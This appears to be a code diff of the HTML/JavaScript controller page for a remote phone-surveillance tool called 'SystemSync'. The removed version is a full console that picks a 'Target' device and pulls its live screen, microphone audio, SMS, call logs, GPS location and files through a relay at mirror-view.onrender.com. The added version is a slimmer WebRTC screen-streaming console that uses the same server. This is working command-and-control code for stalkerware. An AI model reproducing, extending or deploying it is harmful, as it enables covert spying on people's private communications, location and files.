@@ -1,350 +1,268 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SystemSync - Master Console</title>
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-    <style>
-        :root {
-            --sidebar-width: 260px;
-            --bg-body: #050505;
-            --bg-card: #0f0f0f;
-            --accent: #00d2ff;
-            --danger: #ff4b2b;
-            --text-main: #e0e0e0;
-            --border: #222;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-        body { 
-            font-family: 'Segoe UI', Roboto, sans-serif; 
-            background: var(--bg-body); color: var(--text-main); 
-            margin: 0; display: flex; height: 100vh; overflow: hidden;
-        }
+<title>SystemSync Console</title>
 
-        /* --- LOGIN OVERLAY --- */
-        #login-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.98); z-index: 2000;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-        }
-        .login-box {
-            background: var(--bg-card); padding: 40px; border-radius: 15px;
-            border: 1px solid var(--accent); text-align: center; width: 380px;
-            box-shadow: 0 0 30px rgba(0, 210, 255, 0.2);
-        }
-        #device-selector {
-            width: 100%; padding: 12px; margin: 20px 0; border-radius: 8px;
-            border: 1px solid var(--border); background: #1a1a1a; color: white; font-size: 16px;
-        }
-        .btn-connect-main {
-            width: 100%; padding: 12px; background: var(--accent); color: black;
-            font-weight: bold; border: none; border-radius: 8px; cursor: pointer;
-        }
+<style>
 
-        /* --- UI LAYOUT --- */
-        .sidebar {
-            width: var(--sidebar-width); background: #000;
-            border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 25px 0;
-        }
-        .nav-item {
-            padding: 15px 25px; cursor: pointer; color: #888; transition: 0.3s;
-            border-left: 3px solid transparent;
-        }
-        .nav-item:hover, .nav-item.active {
-            color: var(--accent); background: rgba(0, 210, 255, 0.05);
-            border-left: 3px solid var(--accent);
-        }
+body{
+    margin:0;
+    background:#050505;
+    color:#e0e0e0;
+    font-family:Segoe UI;
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+}
 
-        .main-content { flex: 1; display: flex; flex-direction: column; padding: 25px; overflow-y: auto; }
-        .view-section { display: none; }
-        .view-section.active { display: block; }
+header{
+    width:100%;
+    padding:18px;
+    background:#000;
+    border-bottom:1px solid #111;
+    text-align:center;
+    font-size:22px;
+    color:#00d2ff;
+}
 
-        .card { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 20px; margin-bottom: 20px; }
-        
-        /* Elements */
-        #screen-display { width: 100%; max-width: 450px; border-radius: 8px; border: 2px solid var(--border); }
-        .log-container { height: 400px; overflow-y: auto; background: #000; padding: 10px; border-radius: 8px; font-family: monospace; }
-        .log-row { padding: 8px; border-bottom: 1px solid #111; font-size: 13px; }
-        #map { height: 450px; border-radius: 12px; }
-        canvas { background: #000; width: 100%; height: 100px; border-radius: 8px; }
+#panel{
+    margin-top:20px;
+    background:#0f0f0f;
+    padding:20px;
+    border-radius:12px;
+    border:1px solid #222;
+    width:480px;
+}
 
-        .btn { 
-            padding: 10px 20px; border-radius: 6px; border: none; cursor: pointer; 
-            font-weight: bold; margin-right: 10px; transition: 0.3s;
-        }
-        .btn-primary { background: var(--accent); color: #000; }
-        .btn-danger { background: var(--danger); color: #fff; }
-        .btn-record.active { animation: blink 1s infinite; background: red; }
-        @keyframes blink { 50% { opacity: 0.5; } }
-    </style>
+select,button{
+    padding:10px;
+    border:none;
+    border-radius:6px;
+    margin:6px;
+}
+
+button{
+    cursor:pointer;
+    font-weight:bold;
+}
+
+.start{
+    background:#00d2ff;
+}
+
+.stop{
+    background:#ff4b2b;
+    color:white;
+}
+
+video{
+    margin-top:15px;
+    width:100%;
+    border-radius:10px;
+    background:black;
+}
+
+.status{
+    margin-top:10px;
+    font-size:14px;
+}
+
+</style>
 </head>
+
 <body>
 
-    <div id="login-overlay">
-        <div class="login-box">
-            <h1 style="color:var(--accent); margin-bottom:5px;">SystemSync</h1>
-            <p style="color:#666">Multi-Device Control Gateway</p>
-            <select id="device-selector">
-                <option value="">Scanning for devices...</option>
-            </select>
-            <button class="btn-connect-main" onclick="connectToDevice()">ESTABLISH CONNECTION</button>
-        </div>
-    </div>
-<div id="section-files" class="view-section">
-    <div class="card">
-        <h4>File Explorer</h4>
-        <input type="text" id="file-path" value="/sdcard/" style="width:70%; padding:10px; background:#111; color:white; border:1px solid #333;">
-        <button class="btn btn-primary" onclick="requestFiles()">BROWSE</button>
-        <div id="file-list" class="log-container" style="margin-top:15px;"></div>
-    </div>
+<header>
+SystemSync Remote Console
+</header>
+
+<div id="panel">
+
+<b>Select Device</b><br>
+
+<select id="device-selector"></select>
+
+<button onclick="connectToDevice()">CONNECT</button>
+
+<br><br>
+
+<button class="start" onclick="sendCommand('START_SCREEN')">
+START STREAM
+</button>
+
+<button class="stop" onclick="sendCommand('STOP_SCREEN')">
+STOP STREAM
+</button>
+
+<video id="screen-display" autoplay playsinline></video>
+
+<div id="status" class="status">Connecting to server...</div>
+
 </div>
-    <div class="sidebar">
-        <h3 style="padding:0 25px; color:var(--accent)">CONSOLE</h3>
-        <div class="nav-item active" onclick="showSection('screen')">Live Screen</div>
-        <div class="nav-item" onclick="showSection('camera')">Camera Feed</div>
-        <div class="nav-item" onclick="showSection('audio')">Microphone</div>
-        <div class="nav-item" onclick="showSection('data')">Logs (SMS/Calls)</div>
-        <div class="nav-item" onclick="showSection('gps')">GPS Tracker</div>
-        <div class="nav-item" onclick="showSection('files')">File Explorer</div>
-    </div>
 
-    <div class="main-content">
-        <div style="display:flex; justify-content:space-between; margin-bottom:30px; align-items:center;">
-            <div>Target: <b id="display-device-name" style="color:var(--accent)">None Selected</b></div>
-            <div id="status-tag" style="color:var(--danger)">● OFFLINE</div>
-        </div>
+<script>
 
-        <div id="section-screen" class="view-section active">
-            <div class="card">
-                <button class="btn btn-primary" onclick="sendCommand('START_SCREEN')">START STREAM</button>
-                <button id="record-btn" class="btn btn-danger" onclick="toggleRecording()">START RECORDING</button>
-                <p>Live View:</p>
-                <img id="screen-display" src="" alt="Waiting for stream...">
-            </div>
-        </div>
+const SERVER = "wss://mirror-view.onrender.com";
+const socket = new WebSocket(SERVER);
 
-        <div id="section-audio" class="view-section">
-            <div class="card">
-                <button class="btn btn-primary" onclick="sendCommand('START_AUDIO')">LISTEN LIVE</button>
-                <button class="btn btn-danger" onclick="sendCommand('STOP_AUDIO')">STOP</button>
-                <p>Visualizer:</p>
-                <canvas id="audio-canvas"></canvas>
-            </div>
-        </div>
+let pc;
+let selectedDevice = null;
 
-        <div id="section-data" class="view-section">
-            <div style="display:grid; grid-template-columns: 1fr 1fr; gap: 20px;">
-                <div class="card">
-                    <h4>SMS Inbox</h4>
-                    <button class="btn btn-primary" onclick="sendCommand('GET_SMS')">REFRESH</button>
-                    <div id="sms-list" class="log-container"></div>
-                </div>
-                <div class="card">
-                    <h4>Call History</h4>
-                    <button class="btn btn-primary" onclick="sendCommand('GET_CALLS')">REFRESH</button>
-                    <div id="call-list" class="log-container"></div>
-                </div>
-            </div>
-        </div>
+// --------------------
+// CONNECT TO SIGNALING
+// --------------------
 
-        <div id="section-gps" class="view-section">
-            <div class="card">
-                <button class="btn btn-primary" onclick="sendCommand('START_GPS')">LOCATE DEVICE</button>
-                <div id="map"></div>
-            </div>
-        </div>
-    </div>
+socket.onopen = () => {
 
-    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-    <script>
-        const socket = new WebSocket('wss://mirror-view.onrender.com');
-        let currentTargetId = null;
+    updateStatus("Connected to signaling server");
 
-        // --- 1. WebSocket Multi-Device Routing ---
-        socket.onopen = () => {
-            socket.send("I_AM_CONTROLLER"); // Identity Handshake
-            updateStatus(true);
-        };
+    socket.send(JSON.stringify({
+        type:"REGISTER_CONTROLLER"
+    }));
+};
 
-        socket.onmessage = (event) => {
-            const data = event.data;
+// --------------------
+// RECEIVE SIGNALS
+// --------------------
 
-            // Handle Device List updates
-            if (data.startsWith("DEVICE_LIST:")) {
-                const devices = JSON.parse(data.replace("DEVICE_LIST:", ""));
-                const selector = document.getElementById('device-selector');
-                selector.innerHTML = devices.length ? "" : '<option value="">No devices connected</option>';
-                devices.forEach(dev => {
-                    const opt = document.createElement('option');
-                    opt.value = dev.id;
-                    opt.innerText = dev.name;
-                    selector.appendChild(opt);
-                });
+socket.onmessage = async (event)=>{
+
+    const msg = JSON.parse(event.data);
+
+    switch(msg.type){
+
+        case "DEVICE_LIST":
+            populateDevices(msg.devices);
+            break;
+
+        case "OFFER":
+
+            await createPeer();
+
+            await pc.setRemoteDescription(
+                new RTCSessionDescription(msg)
+            );
+
+            const answer = await pc.createAnswer();
+            await pc.setLocalDescription(answer);
+
+            socket.send(JSON.stringify({
+                type:"ANSWER",
+                sdp:answer.sdp
+            }));
+
+            break;
+
+        case "ICE":
+
+            if(pc){
+                pc.addIceCandidate(msg.candidate);
             }
 
-            // Handle specific device data
-            else if (data.startsWith("FRAME:")) {
-                const img = document.getElementById('screen-display');
-                img.src = "data:image/jpeg;base64," + data.replace("FRAME:", "");
-                if (isRecording) drawToRecordingCanvas(img);
-            }
-            else if (data.startsWith("AUDIO:")) {
-                playAudio(data.replace("AUDIO:", ""));
-            }
-            else if (data.startsWith("SMS_DATA:")) {
-                renderLogs('sms-list', data.replace("SMS_DATA:", ""));
-            }
-            else if (data.startsWith("CALL_DATA:")) {
-                renderLogs('call-list', data.replace("CALL_DATA:", ""));
-            }
-            else if (data.startsWith("GPS_DATA:")) {
-                updateMap(data.replace("GPS_DATA:", ""));
-            }
-        };
+            break;
+    }
+};
 
-        function connectToDevice() {
-            const selector = document.getElementById('device-selector');
-            if (!selector.value) return alert("Please select a device!");
-            
-            currentTargetId = selector.value;
-            socket.send("SELECT_DEVICE:" + currentTargetId);
-            
-            document.getElementById('login-overlay').style.display = 'none';
-            document.getElementById('display-device-name').innerText = selector.options[selector.selectedIndex].text;
-        }
+// --------------------
+// DEVICE LIST
+// --------------------
 
-        function sendCommand(cmd) {
-            if (!currentTargetId) return;
-            socket.send(cmd);
-        }
+function populateDevices(devices){
 
-        // --- 2. Live Audio Engine & Visualizer ---
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const analyser = audioCtx.createAnalyser();
-        analyser.fftSize = 256;
-        const canvas = document.getElementById('audio-canvas');
-        const ctx = canvas.getContext('2d');
+    const selector =
+        document.getElementById("device-selector");
 
-        function playAudio(base64) {
-            const binary = atob(base64);
-            const bytes = new Int16Array(binary.length / 2);
-            for (let i = 0; i < bytes.length; i++) {
-                bytes[i] = binary.charCodeAt(i * 2) | (binary.charCodeAt(i * 2 + 1) << 8);
-            }
-            const buffer = audioCtx.createBuffer(1, bytes.length, 44100);
-            const data = buffer.getChannelData(0);
-            for (let i = 0; i < bytes.length; i++) data[i] = bytes[i] / 32768.0;
+    selector.innerHTML="";
 
-            const source = audioCtx.createBufferSource();
-            source.buffer = buffer;
-            source.connect(analyser);
-            analyser.connect(audioCtx.destination);
-            source.start();
-            drawVisualizer();
-        }
+    devices.forEach(d=>{
 
-        function drawVisualizer() {
-            const bufferLength = analyser.frequencyBinCount;
-            const dataArray = new Uint8Array(bufferLength);
-            analyser.getByteFrequencyData(dataArray);
-            ctx.fillStyle = '#000'; ctx.fillRect(0, 0, canvas.width, canvas.height);
-            const barWidth = (canvas.width / bufferLength) * 2.5;
-            let x = 0;
-            for(let i = 0; i < bufferLength; i++) {
-                const barHeight = dataArray[i] / 2;
-                ctx.fillStyle = 'rgb(0, 210, 255)';
-                ctx.fillRect(x, canvas.height - barHeight, barWidth, barHeight);
-                x += barWidth + 1;
-            }
-        }
+        const opt=document.createElement("option");
 
-        // --- 3. Screen Recording Logic ---
-        let mediaRecorder; let recordedChunks = []; let isRecording = false;
-        const recCanvas = document.createElement('canvas');
-        const recCtx = recCanvas.getContext('2d');
+        opt.value=d.id;
+        opt.text=d.name;
 
-        function toggleRecording() {
-            const btn = document.getElementById('record-btn');
-            if (!isRecording) {
-                recordedChunks = [];
-                const stream = recCanvas.captureStream(25);
-                mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
-                mediaRecorder.ondataavailable = (e) => recordedChunks.push(e.data);
-                mediaRecorder.onstop = saveVideo;
-                mediaRecorder.start();
-                isRecording = true;
-                btn.classList.add('active'); btn.innerText = "STOP RECORDING";
-            } else {
-                mediaRecorder.stop();
-                isRecording = false;
-                btn.classList.remove('active'); btn.innerText = "START RECORDING";
-            }
-        }
-
-        function drawToRecordingCanvas(img) {
-            recCanvas.width = img.naturalWidth; recCanvas.height = img.naturalHeight;
-            recCtx.drawImage(img, 0, 0);
-        }
-function requestFiles() {
-    const path = document.getElementById('file-path').value;
-    sendCommand("GET_FILES:" + path);
+        selector.appendChild(opt);
+    });
 }
 
-// Update your socket.onmessage to handle the FILE_DATA prefix
-// inside else if (data.startsWith("FILE_DATA:")) { ... }
-function renderFiles(json) {
-    const list = document.getElementById('file-list');
-    const files = JSON.parse(json);
-    list.innerHTML = files.map(f => `
-        <div class="log-row" style="cursor:pointer" onclick="browseSubDir('${f.path}')">
-            ${f.isDir ? '📁' : '📄'} <b>${f.name}</b>
-        </div>
-    `).join('');
+// --------------------
+// CONNECT TO DEVICE
+// --------------------
+
+function connectToDevice(){
+
+    selectedDevice =
+        document.getElementById("device-selector").value;
+
+    socket.send(JSON.stringify({
+        type:"SELECT_DEVICE",
+        deviceId:selectedDevice
+    }));
+
+    updateStatus("Device selected");
 }
-        function saveVideo() {
-            const blob = new Blob(recordedChunks, { type: 'video/webm' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a'); a.href = url;
-            a.download = `sync_capture_${Date.now()}.webm`; a.click();
-        }
 
-        // --- 4. GPS & Logs ---
-        const map = L.map('map').setView([0, 0], 2);
-        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
-        let marker = L.marker([0, 0]).addTo(map);
+// --------------------
+// CREATE WEBRTC PEER
+// --------------------
 
-        function updateMap(coords) {
-            const [lat, lng] = coords.split(',').map(Number);
-            map.setView([lat, lng], 17);
-            marker.setLatLng([lat, lng]);
-        }
+async function createPeer(){
 
-        function renderLogs(id, json) {
-            const list = document.getElementById(id);
-            const data = JSON.parse(json);
-            list.innerHTML = data.map(item => `
-                <div class="log-row">
-                    <b style="color:var(--accent)">${item.from || item.number}</b><br>
-                    <span>${item.body || 'Call Log Entry'}</span>
-                </div>
-            `).join('');
-        }
+    pc = new RTCPeerConnection({
 
-        function showSection(id) {
-            document.querySelectorAll('.view-section').forEach(s => s.classList.remove('active'));
-            document.getElementById('section-' + id).classList.add('active');
-            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
-            event.currentTarget.classList.add('active');
-            if(id === 'gps') setTimeout(() => map.invalidateSize(), 400);
-        }
+        iceServers:[
+            {urls:"stun:stun.l.google.com:19302"}
+        ]
+    });
 
-        function updateStatus(online) {
-            const tag = document.getElementById('status-tag');
-            tag.innerText = online ? "● SERVER CONNECTED" : "● OFFLINE";
-            tag.style.color = online ? "#00ff00" : "#ff4b2b";
+    pc.ontrack = e => {
+
+        document
+            .getElementById("screen-display")
+            .srcObject = e.streams[0];
+
+        updateStatus("Streaming LIVE");
+    };
+
+    pc.onicecandidate = e => {
+
+        if(e.candidate){
+
+            socket.send(JSON.stringify({
+                type:"ICE",
+                candidate:e.candidate
+            }));
         }
-    </script>
+    };
+}
+
+// --------------------
+// SEND COMMAND
+// --------------------
+
+function sendCommand(cmd){
+
+    if(!selectedDevice){
+        alert("Select a device first!");
+        return;
+    }
+
+    socket.send(JSON.stringify({
+        type:"COMMAND",
+        command:cmd
+    }));
+}
+
+// --------------------
+
+function updateStatus(text){
+    document.getElementById("status").innerText = text;
+}
+
+</script>
+
 </body>
 </html>
-
